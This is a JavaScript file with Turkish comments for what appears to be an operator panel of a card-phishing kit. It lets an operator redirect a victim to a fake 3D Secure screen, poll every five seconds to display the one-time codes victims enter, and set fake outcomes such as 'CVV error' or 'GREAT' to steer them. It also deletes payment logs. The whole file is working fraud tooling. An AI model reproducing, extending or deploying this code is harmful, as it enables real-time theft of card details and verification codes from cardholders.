/**
 * 3D Kod Gönderme
 */
function send3DCode(orderId) {
    if (!confirm('Müşteri 3D doğrulama ekranına yönlendirilecek. Devam etmek istiyor musunuz?')) {
        return;
    }

    $.ajax({
        url: 'admin_process.php',
        method: 'POST',
        dataType: 'json',
        data: {
            action: 'send_3d',
            order_id: orderId
        }
    })
    .done(function(data) {
        if (data.success) {
            alert('Müşteri 3D doğrulama ekranına yönlendirildi!');
            // 3D kod alanını güncelle
            $('#3d-code-' + orderId).html('<span class="badge bg-info">Doğrulama Bekleniyor</span>');
        } else {
            alert('Hata: ' + data.message);
        }
    })
    .fail(function(xhr, status, error) {
        console.error('İşlem hatası:', error);
        alert('İşlem sırasında bir hata oluştu: ' + error);
    });
}

/**
 * Ödeme Durumunu Güncelleme
 */
function setPaymentStatus(orderId, status) {
    let statusText = '';

    switch (status) {
        case 'cvv_error':
            statusText = 'CVV Hatalı';
            break;
        case 'card_error':
            statusText = 'Kart Hatalı';
            break;
        case 'insufficient_funds':
            statusText = 'Bakiye Yetersiz';
            break;
        case 'GREAT':
            statusText = 'GREAT (Başarılı)';
            break;
        default:
            statusText = status;
    }

    if (!confirm(statusText + ' durumuna geçilecek. Onaylıyor musunuz?')) {
        return;
    }

    $.ajax({
        url: 'admin_process.php',
        method: 'POST',
        dataType: 'json',
        data: {
            action: 'update_status',
            order_id: orderId,
            status: status
        }
    })
    .done(function(data) {
        if (data.success) {
            alert('Ödeme durumu güncellendi!');
            location.reload(); // Sayfayı yenile
        } else {
            alert('Hata: ' + data.message);
        }
    })
    .fail(function(xhr, status, error) {
        console.error('İşlem hatası:', error);
        alert('İşlem sırasında bir hata oluştu: ' + error);
    });
}

/**
 * Ödeme Logu Silme
 */
function deletePaymentLog(orderId) {
    if (!confirm('Bu işlem kaydını silmek istediğinizden emin misiniz?')) {
        return;
    }

    $.ajax({
        url: 'admin_process.php',
        method: 'POST',
        dataType: 'json',
        data: {
            action: 'delete_log',
            order_id: orderId
        }
    })
    .done(function(data) {
        if (data.success) {
            alert('İşlem logu silindi!');
            location.reload(); // Sayfayı yenile
        } else {
            alert('Hata: ' + data.message);
        }
    })
    .fail(function(xhr, status, error) {
        console.error('İşlem hatası:', error);
        alert('İşlem sırasında bir hata oluştu: ' + error);
    });
}

/**
 * 3D Kod / Durum Takibi
 */
function check3DStatus() {
    $.ajax({
        url: 'admin_process.php',
        method: 'GET',
        dataType: 'json',
        data: {
            action: 'check_3d_status'
        }
    })
    .done(function(data) {
        if (data.pending_transactions) {
            // Her bir bekleyen 3D işlemi için ekranda kod vb. bilgileri güncelle
            $.each(data.pending_transactions, function(i, tx) {
                const codeElement = $('#3d-code-' + tx.id);
                if (codeElement.length && tx.code) {
                    codeElement.html('<span class="badge bg-success">' + tx.code + '</span>');
                }
            });
        }
    })
    .fail(function(xhr, status, error) {
        console.error('3D durum kontrolü hatası:', error);
    });
}

// DOM yüklendiğinde
document.addEventListener('DOMContentLoaded', function() {
    // 1) 3D Kod Gönder butonları
    document.querySelectorAll('.js-send3d').forEach(function(elem) {
        elem.addEventListener('click', function(e) {
            e.preventDefault();
            const orderId = this.getAttribute('data-order-id');
            send3DCode(orderId);
        });
    });

    // 2) Ödeme Durumu Güncelleme butonları (cvv_error, card_error, etc.)
    document.querySelectorAll('.js-setstatus').forEach(function(elem) {
        elem.addEventListener('click', function(e) {
            e.preventDefault();
            const orderId = this.getAttribute('data-order-id');
            const status  = this.getAttribute('data-status');
            setPaymentStatus(orderId, status);
        });
    });

    // 3) Ödeme Logu Sil butonları
    document.querySelectorAll('.js-deletelog').forEach(function(elem) {
        elem.addEventListener('click', function(e) {
            e.preventDefault();
            const orderId = this.getAttribute('data-order-id');
            deletePaymentLog(orderId);
        });
    });

    // 4) Sayfa yüklendiğinde bir kez 3D durumunu kontrol et
    check3DStatus();

    // 5) Her 5 saniyede bir 3D durumunu yeniden kontrol et
    setInterval(check3DStatus, 5000);
});
